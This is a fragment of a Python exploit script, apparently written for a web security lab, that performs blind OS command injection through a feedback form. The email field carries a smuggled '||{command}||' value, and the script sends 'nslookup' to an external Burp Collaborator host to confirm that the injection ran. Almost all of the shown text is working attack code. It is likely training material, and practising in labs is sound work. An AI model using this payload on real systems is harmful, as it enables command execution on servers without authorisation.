...
def exploit(s, url, path, command):
    target_url = url + path
    payload = f'csrf={get_csrf_token(s,url,'/feedback')}&name=test&&email=x%40gmail.co||{command}||m&subject=x&message=x'
...
def main():
    ...
    exploit(s, url, '/feedback/submit', 'nslookup abc123xyz.burpcollaborator.net')
